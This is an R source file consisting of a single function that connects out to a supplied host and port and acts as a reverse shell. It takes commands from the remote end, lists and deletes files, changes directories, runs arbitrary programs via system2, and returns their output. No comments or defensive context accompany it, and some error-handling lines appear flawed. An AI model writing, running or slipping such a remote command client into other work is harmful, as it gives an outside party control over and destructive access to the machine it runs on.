client <- function(host, port) {
  socket <- socketConnection(host=host, port=port, server=FALSE, blocking=TRUE, encoding="utf-8", timeout=300, open="r+")
  exiting <- FALSE
  toServer <- "Connected"
  while(!exiting) {
    writeLines(toServer, socket)
    rawCommand <- readLines(socket, 1)
    command <- strsplit(rawCommand, " ", fixed=TRUE)[[1]]
    if (!(is.na(command[1]))) {
      if (command[1] == "exit") {
        exiting <- TRUE
      }
      else if (command[1] == "dir" || command[1] == "ls") {
        toServer <- toString(dir(all.files = TRUE))
      }
      else if (command[1] == "pwd") {
        toServer <- getwd()
      }
      else if (command[1] == "cd") {
        toServer <- tryCatch( {
          dirname <- substring(rawCommand, 4)
          setwd(dirname)
        }, error=function(e) {
          return(paste("Error: ", e$message))
        })
      }
      else if (command[1] == "del" || command[1] == "rm") {
        toServer <- tryCatch( {
          start <- nchar(command[1]) + 2
          filename <- substring(rawCommand, start)
          file.remove(filename)
          return(paste("Deleted", filename))
        }, error=function(e) {
          return(paste("Error: ", e$message))
        })
      }
      else {
        toServer <- tryCatch({
          args = ""
          return(paste(system2(command[1], stdout=TRUE, args=command[-1])))
        }, error= function(e) {
          return(paste("Error: ", e$message))
        })
      }
    }
  }
  close(socket)
  print("Socket closed")
}
